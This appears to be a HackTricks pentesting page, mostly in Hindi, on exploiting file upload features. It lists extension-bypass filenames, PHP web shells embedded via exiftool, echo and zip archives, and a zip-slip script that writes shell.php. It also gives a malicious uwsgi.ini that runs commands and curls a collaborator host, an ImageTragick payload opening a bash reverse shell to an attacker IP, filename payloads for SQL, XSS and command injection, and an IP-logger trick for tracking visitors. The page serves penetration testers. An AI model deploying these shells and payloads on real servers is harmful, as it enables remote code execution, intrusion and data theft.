# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### फ़ाइल एक्सटेंशन जांच बायपास करना

1. यदि लागू हों, तो **पहले बताए गए एक्सटेंशंस** की **जांच** करें। साथ ही कुछ **uppercase letters** के साथ भी टेस्ट करें: _pHp, .pHP5, .PhAr ..._
2. _चेक करें **वैध एक्सटेंशन के पहले एक वैध एक्सटेंशन जोड़ने** का (पहले बताए गए एक्सटेंशंस का भी उपयोग करें):_
- _file.png.php_
- _file.png.Php5_
3. अंत में **विशेष वर्ण जोड़ने** की कोशिश करें। आप Burp का उपयोग करके सभी **ASCII** और **Unicode** characters को **bruteforce** कर सकते हैं। (_ध्यान दें कि आप **पहले** बताए गए **extensions** का भी उपयोग कर सकते हैं_)  
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. प्रोटेक्शंस को बायपास करने के लिए **server-side के extension parser को trick** करने की कोशिश करें, जैसे **extension को duplicate** करना या एक्सटेंशंस के बीच **junk data (null bytes)** डालना। _बेहतर payload तैयार करने के लिए आप **पहले बताए गए एक्सटेंशंस** का भी इस्तेमाल कर सकते हैं।_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछले चेक में **एक और परत एक्सटेंशंस** जोड़कर देखें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **exec एक्सटेंशन को वैध एक्सटेंशन से पहले** रखने की कोशिश करें और उम्मीद करें कि सर्वर misconfigured हो। (यह Apache misconfigurations का फायदा उठा सकता है जहाँ किसी भी फाइल का extension **.php** होने पर, भले ही फाइल .php पर खत्म न हो, code execute हो सकता है):
- _ex: file.php.png_
7. **Windows** में **NTFS alternate data stream (ADS)** का उपयोग करना। इस मामले में एक colon ":" प्रतिबंधित एक्सटेंशन के बाद और अनुमत एक्सटेंशन से पहले डाला जाएगा। परिणामस्वरूप, सर्वर पर **खाली फाइल जिस पर प्रतिबंधित एक्सटेंशन है** बन सकती है (उदा. "file.asax:.jpg”). यह फाइल बाद में अन्य तकनीकों से edit की जा सकती है जैसे कि इसकी short filename का उपयोग। "**::$data**” pattern का उपयोग non-empty फाइल बनाने के लिए भी किया जा सकता है। इसलिए इस pattern के बाद एक dot जोड़ना आगे की प्रतिबंधों को बायपास करने में उपयोगी हो सकता है (उदा. "file.asp::$data.”)
8. फ़ाइल नाम की लिमिट्स तोड़ने की कोशिश करें। वैध एक्सटेंशन कट जाता है और malicious PHP बच जाता है। AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, Magic Number, Compression & Resizing को बायपास करना

- **Content-Type** checks को बायपास करने के लिए **Content-Type header** के **value** को सेट करें: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** चेक को बायपास करने के लिए फाइल की शुरुआत में किसी असली image के **bytes** जोड़ें (ताकि _file_ command confuse हो)। या shell को **metadata** में डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे image में भी डाल सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- यदि आपकी image पर **compression** लागू की जा रही है, जैसे कि कुछ standard PHP libraries जैसे [PHP-GD](https://www.php.net/manual/fr/book.image.php) का उपयोग करते हुए, तो ऊपर दी गई तकनीकें काम नहीं करेंगी। ऐसे में आप **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर कुछ टेक्स्ट insert कर सकते हैं जो **compression के बाद भी बचे** रह सकता है।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज image को **resize** भी कर सकता है, उदाहरण के लिए PHP-GD की `imagecopyresized` या `imagecopyresampled` functions का उपयोग करते हुए। हालाँकि, आप **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर ऐसा टेक्स्ट insert कर सकते हैं जो **compression के बाद भी बचा रहे**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और तकनीक जिससे payload image resizing सहन कर सके, PHP-GD की `thumbnailImage` function का उपयोग करके है। फिर भी, आप **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर ऐसा टेक्स्ट insert कर सकते हैं जो **compression/resize के बाद भी बचा रहे**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### अन्य जाँचने योग्य ट्रिक्स

- पहले से upload की गई फाइल का नाम **rename** करने की vulnerability ढूँढें (ताकि एक्सटेंशन बदला जा सके)।
- backdoor execute करने के लिए कोई **Local File Inclusion** vulnerability ढूँढें।
- **संभव सूचना प्रकटीकरण**:
1. एक ही फाइल को **कई बार** (और एक ही समय पर) एक ही **नाम** से upload करें।
2. किसी ऐसे फाइल या फोल्डर के नाम से फाइल upload करें जो पहले से मौजूद हो।
3. नाम के रूप में **".", "..", या "..."** जैसी फ़ाइलें अपलोड करना। उदाहरण के लिए, Apache में **Windows** पर, यदि application uploaded files को "/www/uploads/" डायरेक्टरी में सेव करती है, तो "." filename "/www/" डायरेक्टरी में "uploads" नाम की एक फाइल बना देगा।
4. **NTFS** में ऐसी फाइल upload करें जिसे आसानी से delete न किया जा सके जैसे **"...:.jpg"**। (Windows)
5. **Windows** में ऐसे invalid characters वाले नाम से फाइल upload करने की कोशिश करें जैसे `|<>*?”`।
6. **Windows** में reserved (forbidden) names जैसे CON, PRN, AUX, NUL, COM1 ... LPT9 का उपयोग करके फाइल upload करने की कोशिश करें।
- साथ ही यह भी आज़माएँ कि कोई **executable (.exe)** या एक **.html** फाइल upload करें (कम शक पैदा करने वाली) जिसे victim के द्वारा गलती से खोलने पर code execute हो सकता है।

### Special extension ट्रिक्स

यदि आप **PHP server** पर फाइलें upload कर रहे हैं, तो code execute करने के लिए [**.htaccess** trick देखें](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप **ASP server** पर फाइलें upload कर रहे हैं, तो code execute करने के लिए [**.config** trick देखें](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` फाइलें Java के `.jar` की तरह हैं, लेकिन php के लिए, और इन्हें **php file की तरह** use किया जा सकता है (php से execute करके, या किसी script में include करके...)

`.inc` extension कभी-कभी php फाइल्स के लिए इस्तेमाल होता है जो केवल import के लिए होते हैं, इसलिए किसी बिंदु पर किसी ने इस extension को execute होने की अनुमति दे रखी हो सकती है।

## **Jetty RCE**

यदि आप Jetty server में एक XML फ़ाइल upload कर सकें तो आप [RCE प्राप्त कर सकते हैं क्योंकि new \*.xml and \*.war are automatically processed](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** इसलिए, जैसा कि निम्नलिखित छवि में बताया गया है, XML फ़ाइल को `$JETTY_BASE/webapps/` में upload करें और shell की उम्मीद रखें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability की विस्तृत जाँच के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

यदि किसी को `.ini` configuration file modify करने की क्षमता मिलती है तो uWSGI servers में Remote Command Execution (RCE) vulnerabilities का उपयोग किया जा सकता है। uWSGI configuration files एक विशिष्ट syntax का उपयोग करते हैं जिसमें "magic" variables, placeholders, और operators शामिल होते हैं। खास तौर पर, '@' operator, जिसका उपयोग `@(filename)` के रूप में होता है, किसी फाइल की सामग्री include करने के लिए डिज़ाइन किया गया है। uWSGI में समर्थित विभिन्न schemes में से, "exec" scheme विशेष रूप से शक्तिशाली है, जो किसी process के standard output से डेटा पढ़ने की अनुमति देता है। जब एक `.ini` configuration file process होती है तो इस फीचर का दुरुपयोग Remote Command Execution या Arbitrary File Write/Read के लिए किया जा सकता है।

निम्नलिखित हानिकारक `uwsgi.ini` फाइल का उदाहरण विचार करें, जो विभिन्न schemes का प्रदर्शन करता है:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

यह समझना ज़रूरी है कि uWSGI की configuration file parsing काफी lax है। विशेष रूप से, ऊपर चर्चा किया गया payload एक binary file (जैसे image या PDF) में insert किया जा सकता है, जिससे संभावित exploitation का दायरा और बढ़ जाता है।

## **wget File Upload/SSRF Trick**

कुछ मामलों में आप पाएंगे कि एक server **`wget`** का उपयोग **download files** करने के लिए कर रहा है और आप **indicate** कर सकते हैं **URL**। ऐसे मामलों में, code यह जांच सकता है कि downloaded files का extension whitelist में है ताकि केवल allowed files ही download हों। हालांकि, **यह check bypass किया जा सकता है।**

The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"\*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) एक शक्तिशाली टूल है जो Pentesters और Bug Hunters को file upload mechanisms का परीक्षण करने में सहायता देने के लिए बनाया गया है। यह विभिन्न bug bounty techniques का उपयोग करके vulnerabilities की पहचान और exploit करने की प्रक्रिया को सरल बनाता है, जिससे web applications का thorough assessment सुनिश्चित होता है।

### Corrupting upload indices with snprintf quirks (historical)

कुछ legacy upload handlers जो `snprintf()` या समान फ़ंक्शन्स का उपयोग करके single-file upload से multi-file arrays बनाते हैं, उन्हें `_FILES` स्ट्रक्चर को फोर्ज करने के लिए ट्रिक किया जा सकता है। `snprintf()` व्यवहार में inconsistencies और truncation के कारण, सावधानीपूर्वक बनाए गए एक single upload को server-side पर कई indexed files की तरह दिखाया जा सकता है, जिससे वह logic भ्रमित हो सकता है जो एक strict shape मानता है (उदाहरण के लिए, इसे multi-file upload मानकर unsafe branches लेना)। हालांकि आज यह अधिकतर niche है, यह “index corruption” पैटर्न कभी-कभी CTFs और पुराने codebases में फिर से सामने आता है।

## फ़ाइल अपलोड से अन्य vulnerabilities

- Set **filename** to `../../../tmp/lol.png` और **path traversal** हासिल करने का प्रयास करें
- Set **filename** to `sleep(10)-- -.jpg` और आप संभवतः **SQL injection** हासिल कर सकते हैं
- Set **filename** to `<svg onload=alert(document.domain)>` ताकि **XSS** हासिल हो सके
- Set **filename** to `; sleep 10;` कुछ **command injection** टेस्ट करने के लिए (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- अगर आप web server को किसी URL से image fetch करने के लिए निर्देशित कर सकते हैं तो आप [SSRF](../ssrf-server-side-request-forgery/index.html) का दुरुपयोग करने की कोशिश कर सकते हैं। अगर यह **image** किसी **public** site पर **saved** होने वाली है, तो आप [https://iplogger.org/invisible/](https://iplogger.org/invisible/) का URL भी इंगित कर सकते हैं और हर visitor की जानकारी चुरा सकते हैं।
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- XSS के लिए specially crafted PDFs: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). अगर आप PDFs अपलोड कर सकते हैं तो आप कुछ ऐसा PDF तैयार कर सकते हैं जो दिए गए निर्देशों के अनुसार arbitrary JS execute करेगा।
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content यह जांचने के लिए कि सर्वर में कोई **antivirus** है या नहीं
- फ़ाइलें अपलोड करते समय कोई **size limit** है या नहीं जांचें

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

अन्य filetypes के लिए देखें: [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

## Zip/Tar File Automatically decompressed Upload

यदि आप ऐसा ZIP अपलोड कर सकते हैं जिसे server के अंदर decompress किया जाएगा, तो आप 2 चीजें कर सकते हैं:

### Symlink

ऐसा लिंक अपलोड करें जिसमें other files के soft links शामिल हों, फिर decompressed files तक पहुँचने पर आप linked files तक पहुँच पाएँगे:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### अलग फ़ोल्डरों में Decompress

Decompression के दौरान डायरेक्टरी में फाइलों का अनपेक्षित निर्माण एक गंभीर समस्या है। प्रारंभिक धारणा यह हो सकती है कि यह सेटअप malicious file uploads के जरिए OS-level command execution से सुरक्षा प्रदान करेगा, लेकिन ZIP archive format की hierarchical compression support और directory traversal क्षमताओं का दुरुपयोग किया जा सकता है। इससे attackers decompression functionality को manipulate करके प्रतिबंधों को bypass कर secure upload directories से बाहर निकल सकते हैं।

ऐसे फ़ाइलें बनाने के लिए एक automated exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) पर उपलब्ध है। यह utility नीचे दिखाए अनुसार उपयोग की जा सकती है:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अलावा, **symlink trick with evilarc** एक विकल्प है। यदि उद्देश्य `/flag.txt` जैसे किसी फ़ाइल को लक्षित करना है, तो उस फ़ाइल का एक symlink आपके सिस्टम में बनाया जाना चाहिए। यह सुनिश्चित करता है कि evilarc अपनी क्रिया के दौरान त्रुटियों का सामना न करे।

नीचे एक उदाहरण दिया गया है Python कोड का जो एक malicious zip file बनाने के लिए उपयोग किया जाता है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**कम्प्रेशन का दुरुपयोग (file spraying के लिए)**

अधिक जानकारी के लिए **मूल पोस्ट देखें**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP कोड लिखा गया है जो `$_REQUEST` वैरिएबल के माध्यम से भेजे गए कमांड्स को चलाता है।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: कई फाइलें बनाई जाती हैं और एक zip आर्काइव इन फाइलों को शामिल करके बनाया जाता है।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip के अंदर फाइलों के नाम vi या hex editor का उपयोग करके बदले जाते हैं, "xxA" को "../" में बदलकर डायरेक्टरी traversal किया जाता है।

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

इस कंटेंट को image extension के साथ अपलोड करें ताकि vulnerability **(ImageMagick , 7.0.1-1)** को exploit किया जा सके (from the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG में PHP shell एम्बेड करना

PNG फ़ाइल के IDAT chunk में एक PHP shell एम्बेड करने से कुछ image processing ऑपरेशनों को प्रभावी ढंग से बाइपास किया जा सकता है। PHP-GD की `imagecopyresized` और `imagecopyresampled` फ़ंक्शंस इस संदर्भ में विशेष रूप से प्रासंगिक हैं, क्योंकि इन्हें आमतौर पर images को resize और resample करने के लिए उपयोग किया जाता है। एम्बेड किया गया PHP shell इन ऑपरेशनों से अप्रभावित रहने में सक्षम होना कुछ उपयोग मामलों के लिए बड़ा फायदा है।

इस तकनीक की विस्तृत विवेचना, उसकी methodology और संभावित उपयोगों सहित, निम्नलिखित लेख में दी गई है: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). यह संसाधन प्रक्रिया और उसके प्रभावों की व्यापक समझ प्रदान करता है।

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot फ़ाइलें

Polyglot फ़ाइलें साइबरसुरक्षा में एक अनूठा उपकरण हैं, जो कई file formats में एक साथ वैध रूप से मौजूद रह सकती हैं — एक तरह के chameleon की तरह। एक रोचक उदाहरण [GIFAR](https://en.wikipedia.org/wiki/Gifar) है, जो GIF और RAR archive दोनों के रूप में कार्य करता है। ऐसी फ़ाइलें केवल इस जोड़ी तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसी combinations भी संभव हैं।

Polyglot फ़ाइलों की मुख्य उपयोगिता यह है कि वे उन security measures को बायपास कर सकती हैं जो फ़ाइलों को उनके type के आधार पर स्क्रीन करते हैं। कई एप्लिकेशन में आम प्रैक्टिस यह होती है कि सिर्फ कुछ निश्चित file types ही upload की अनुमति दी जाए — जैसे JPEG, GIF, या DOC — ताकि संभवतः हानिकारक formats (उदा., JS, PHP, या Phar files) से जोखिम कम किया जा सके। हालांकि, एक polyglot, कई file types की structural criteria को पूरा करके, इन प्रतिबंधों को चुपचाप बायपास कर सकता है।

उनकी अनुकूलनशीलता के बावजूद, polyglots को सीमाओं का सामना करना पड़ता है। उदाहरण के लिए, एक polyglot में एक PHAR file और एक JPEG दोनों मौजूद हो सकते हैं, लेकिन उसकी upload की सफलता प्लेटफ़ॉर्म की file extension नीतियों पर निर्भर कर सकती है। यदि सिस्टम अनुमत extensions के प्रति सख्त है, तो polyglot की केवल structural duality अपलोड सुनिश्चित करने के लिए पर्याप्त नहीं हो सकती।

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF जैसा दिखाकर valid JSON अपलोड करना

ऐसा कैसे करें ताकि file type detections को धोखा देकर एक valid JSON फ़ाइल अपलोड की जा सके, भले ही अनुमति न हो, अर्थात PDF फ़ाइल का नकल करना (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: जब तक `%PDF` magic bytes पहले 1024 bytes में हों यह वैध माना जाता है (post से उदाहरण लें)
- **`pdflib` library**: JSON के किसी field के अंदर एक fake PDF format जोड़ दें ताकि library इसे pdf समझ ले (post से उदाहरण लें)
- **`file` binary**: यह एक फ़ाइल से up to 1048576 bytes पढ़ सकता है। बस एक ऐसा JSON बनाएं जो इससे बड़ा हो ताकि यह content को json की तरह parse न कर सके और फिर JSON के अंदर एक वास्तविक PDF का प्रारंभिक भाग डाल दें — यह इसे PDF समझ लेगा

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
